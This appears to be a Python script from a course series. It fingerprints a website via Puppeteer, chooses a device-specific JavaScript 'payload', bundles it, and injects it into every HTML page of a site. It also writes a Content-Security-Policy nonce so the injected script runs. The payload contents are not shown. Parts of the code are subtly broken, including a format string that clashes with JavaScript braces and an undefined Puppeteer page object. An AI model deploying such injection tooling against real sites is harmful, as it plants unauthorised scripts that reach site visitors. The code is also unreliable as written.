# polyglot_builder.py  (Week-6)
import json, re, secrets, subprocess, os, pathlib, shutil
from pathlib import Path
from uuid import uuid4

PAYLOAD_DIR = Path("payloads")
BUILD_DIR   = Path("build")                      # temp dir for esbuild
PAYLOAD_DIR.mkdir(exist_ok=True)
BUILD_DIR.mkdir(exist_ok=True)

# ------------------------------------------------------------------
# CSP helpers
def _detect_csp(html: str) -> dict:
    csp = re.findall(r'<meta[^>]+http-equiv=["\']?Content-Security-Policy["\']?[^>]+content=["\']([^"\']+)', html, re.I)
    if not csp:
        return {}
    rules = {}
    for part in csp[0].split(";"):
        if " " in part:
            directive, *values = part.strip().split()
            rules[directive] = values
    return rules

# ------------------------------------------------------------------
# Puppeteer scraper returns UA + viewport
def _fingerprint_via_puppeteer(url: str) -> dict:
    js = """
    (async () => {
        await page.goto('{url}', {waitUntil: 'domcontentloaded'});
        const ua = await page.evaluate(() => navigator.userAgent);
        const vp = await page.evaluate(() => ({width: screen.width, height: screen.height}));
        return {ua, vp};
    })()
    """.format(url=url)
    cmd = ["node", "-e", js]
    try:
        raw = subprocess.check_output(cmd, text=True, timeout=20)
        return json.loads(raw)
    except Exception:
        # fallback
        return {"ua": "unknown", "vp": {"width": 1920, "height": 1080}}

# ------------------------------------------------------------------
# choose payload variant
def _choose_payload(fingerprint: dict) -> Path:
    ua = fingerprint["ua"].lower()
    w, h = fingerprint["vp"]["width"], fingerprint["vp"]["height"]
    if "mobile" in ua or w < 768:
        return PAYLOAD_DIR / "mobile.js"
    return PAYLOAD_DIR / "desktop.js"

# ------------------------------------------------------------------
# build single bundle.min.js
def _build_bundle(src: Path, tgt: Path, nonce: str, csp: dict):
    out = tgt / "bundle.min.js"
    subprocess.run([
        "esbuild", str(src),
        "--bundle", "--minify",
        "--define:UUID='{}'".format(uuid4().hex),
        "--outfile=" + str(out),
        "--format=iife"
    ], check=True, capture_output=True)

    # decide reference
    inline_ok = "'unsafe-inline'" in csp.get("script-src", [])
    if inline_ok:
        js = out.read_text()
        return f'<script nonce="{nonce}">{js}</script>'
    return f'<script src="bundle.min.js" nonce="{nonce}"></script>'

# ------------------------------------------------------------------
# Entry point
def inject_polyglot(target_dir: str, site_url: str):
    tgt = Path(target_dir)
    fingerprint = _fingerprint_via_puppeteer(site_url)
    chosen = _choose_payload(fingerprint)

    # ensure the chosen payload exists
    if not chosen.exists():
        chosen = PAYLOAD_DIR / "fallback.js"
        chosen.write_text('console.log("fallback")')

    # build once
    for html in tgt.rglob("*.html"):
        html_str = html.read_text(encoding="utf-8", errors="ignore")
        csp = _detect_csp(html_str)
        nonce = secrets.token_urlsafe(12)

        # inject CSP meta if absent
        if not csp:
            html_str = re.sub(
                r"(<head[^>]*>)",
                rf'\1<meta http-equiv="Content-Security-Policy" '
                rf'content="script-src \'self\' \'nonce-{nonce}\';">',
                html_str, flags=re.I
            )

        script_tag = _build_bundle(chosen, tgt, nonce, csp)
        html_str = re.sub(r"(</body>)", script_tag + r"\1", html_str, flags=re.I)
        html.write_text(html_str, encoding="utf-8", errors="ignore")